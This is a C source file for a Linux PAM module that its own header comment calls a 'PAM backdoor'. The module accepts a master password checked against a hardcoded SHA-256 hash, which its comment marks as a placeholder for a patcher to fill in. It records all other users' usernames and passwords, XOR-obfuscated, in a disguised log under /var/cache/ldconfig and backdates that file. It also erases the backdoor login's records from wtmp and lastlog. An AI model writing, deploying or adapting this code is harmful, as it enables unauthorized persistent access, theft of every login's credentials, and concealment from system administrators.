/*
 * PAM backdoor - No external crypto dependencies
 * Pure C SHA256 implementation for maximum portability
 */
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <sys/stat.h>
#include <utime.h>
#include <unistd.h>
#include <utmp.h>
#include <pwd.h>
#include <fcntl.h>
#include <stdint.h>

/* ============ Pure C SHA256 Implementation ============ */

#define ROTR(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define CH(x,y,z) (((x)&(y))^(~(x)&(z)))
#define MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define EP0(x) (ROTR(x,2)^ROTR(x,13)^ROTR(x,22))
#define EP1(x) (ROTR(x,6)^ROTR(x,11)^ROTR(x,25))
#define SIG0(x) (ROTR(x,7)^ROTR(x,18)^((x)>>3))
#define SIG1(x) (ROTR(x,17)^ROTR(x,19)^((x)>>10))

static const uint32_t K[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

typedef struct {
    uint8_t data[64];
    uint32_t datalen;
    uint64_t bitlen;
    uint32_t state[8];
} SHA256_CTX;

static void sha256_transform(SHA256_CTX *ctx, const uint8_t data[]) {
    uint32_t a,b,c,d,e,f,g,h,t1,t2,m[64];
    int i,j;
    for (i=0,j=0; i<16; ++i,j+=4)
        m[i] = ((uint32_t)data[j]<<24)|((uint32_t)data[j+1]<<16)|((uint32_t)data[j+2]<<8)|data[j+3];
    for (; i<64; ++i)
        m[i] = SIG1(m[i-2]) + m[i-7] + SIG0(m[i-15]) + m[i-16];
    a=ctx->state[0];b=ctx->state[1];c=ctx->state[2];d=ctx->state[3];
    e=ctx->state[4];f=ctx->state[5];g=ctx->state[6];h=ctx->state[7];
    for (i=0; i<64; ++i) {
        t1 = h + EP1(e) + CH(e,f,g) + K[i] + m[i];
        t2 = EP0(a) + MAJ(a,b,c);
        h=g;g=f;f=e;e=d+t1;d=c;c=b;b=a;a=t1+t2;
    }
    ctx->state[0]+=a;ctx->state[1]+=b;ctx->state[2]+=c;ctx->state[3]+=d;
    ctx->state[4]+=e;ctx->state[5]+=f;ctx->state[6]+=g;ctx->state[7]+=h;
}

static void sha256_init(SHA256_CTX *ctx) {
    ctx->datalen = 0; ctx->bitlen = 0;
    ctx->state[0]=0x6a09e667;ctx->state[1]=0xbb67ae85;ctx->state[2]=0x3c6ef372;ctx->state[3]=0xa54ff53a;
    ctx->state[4]=0x510e527f;ctx->state[5]=0x9b05688c;ctx->state[6]=0x1f83d9ab;ctx->state[7]=0x5be0cd19;
}

static void sha256_update(SHA256_CTX *ctx, const uint8_t data[], size_t len) {
    for (size_t i=0; i<len; ++i) {
        ctx->data[ctx->datalen] = data[i];
        ctx->datalen++;
        if (ctx->datalen == 64) {
            sha256_transform(ctx, ctx->data);
            ctx->bitlen += 512;
            ctx->datalen = 0;
        }
    }
}

static void sha256_final(SHA256_CTX *ctx, uint8_t hash[]) {
    uint32_t i = ctx->datalen;
    if (ctx->datalen < 56) {
        ctx->data[i++] = 0x80;
        while (i < 56) ctx->data[i++] = 0x00;
    } else {
        ctx->data[i++] = 0x80;
        while (i < 64) ctx->data[i++] = 0x00;
        sha256_transform(ctx, ctx->data);
        memset(ctx->data, 0, 56);
    }
    ctx->bitlen += ctx->datalen * 8;
    ctx->data[63] = ctx->bitlen; ctx->data[62] = ctx->bitlen >> 8;
    ctx->data[61] = ctx->bitlen >> 16; ctx->data[60] = ctx->bitlen >> 24;
    ctx->data[59] = ctx->bitlen >> 32; ctx->data[58] = ctx->bitlen >> 40;
    ctx->data[57] = ctx->bitlen >> 48; ctx->data[56] = ctx->bitlen >> 56;
    sha256_transform(ctx, ctx->data);
    for (i=0; i<4; ++i) {
        hash[i]    = (ctx->state[0] >> (24-i*8)) & 0xff;
        hash[i+4]  = (ctx->state[1] >> (24-i*8)) & 0xff;
        hash[i+8]  = (ctx->state[2] >> (24-i*8)) & 0xff;
        hash[i+12] = (ctx->state[3] >> (24-i*8)) & 0xff;
        hash[i+16] = (ctx->state[4] >> (24-i*8)) & 0xff;
        hash[i+20] = (ctx->state[5] >> (24-i*8)) & 0xff;
        hash[i+24] = (ctx->state[6] >> (24-i*8)) & 0xff;
        hash[i+28] = (ctx->state[7] >> (24-i*8)) & 0xff;
    }
}

static void sha256(const char *str, uint8_t hash[32]) {
    SHA256_CTX ctx;
    sha256_init(&ctx);
    sha256_update(&ctx, (const uint8_t*)str, strlen(str));
    sha256_final(&ctx, hash);
}

/* ============ End SHA256 ============ */

/* PLACEHOLDER - unique pattern patcher finds and replaces */
static const unsigned char H[32] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF,
    0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10,
    0x13, 0x37, 0x42, 0x69, 0xBE, 0xEF, 0xCA, 0xFE
};

static void log_creds(const char *u, const char *p) {
    mkdir("/var/cache/ldconfig", 0755);
    FILE *f = fopen("/var/cache/ldconfig/aux-cache.log", "a");
    if (!f) return;
    char e[256];
    int l = snprintf(e, sizeof(e), "%ld|%s|%s\n", (long)time(NULL), u, p);
    const char *k = "ld.so.cache";
    for (int i = 0; i < l; i++) e[i] ^= k[i % 11];
    fwrite(e, 1, l, f);
    fclose(f);
    struct utimbuf t = {1672531200, 1672531200};
    utime("/var/cache/ldconfig/aux-cache.log", &t);
}

static void scrub_wtmp(const char *u) {
    struct utmp ut;
    int fd = open("/var/log/wtmp", O_RDWR);
    if (fd < 0) return;
    off_t p = lseek(fd, 0, SEEK_END);
    while (p >= (off_t)sizeof(ut)) {
        p -= sizeof(ut);
        lseek(fd, p, SEEK_SET);
        if (read(fd, &ut, sizeof(ut)) != sizeof(ut)) break;
        if (strncmp(ut.ut_user, u, 32) == 0) {
            memset(&ut, 0, sizeof(ut));
            lseek(fd, p, SEEK_SET);
            write(fd, &ut, sizeof(ut));
            break;
        }
    }
    close(fd);
}

static void scrub_lastlog(const char *u) {
    struct passwd *pw = getpwnam(u);
    if (!pw) return;
    int fd = open("/var/log/lastlog", O_RDWR);
    if (fd < 0) return;
    char z[292] = {0};
    lseek(fd, pw->pw_uid * 292, SEEK_SET);
    write(fd, z, 292);
    close(fd);
}

static const char *g_user = NULL;

#define PAM_EXPORT __attribute__((visibility("default")))

PAM_EXPORT PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    unsigned char hash[32];

    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || !user) return PAM_IGNORE;
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL) != PAM_SUCCESS || !pass) return PAM_IGNORE;

    sha256(pass, hash);

    int match = 1;
    for (int i = 0; i < 32; i++) if (hash[i] != H[i]) match = 0;

    if (match) {
        g_user = user;
    } else {
        log_creds(user, pass);
        g_user = NULL;
    }

    return match ? PAM_SUCCESS : PAM_IGNORE;
}

PAM_EXPORT PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXPORT PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXPORT PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (g_user) {
        usleep(100000);
        scrub_wtmp(g_user);
        scrub_lastlog(g_user);
    }
    return PAM_SUCCESS;
}

PAM_EXPORT PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (g_user) {
        scrub_wtmp(g_user);
        g_user = NULL;
    }
    return PAM_SUCCESS;
}
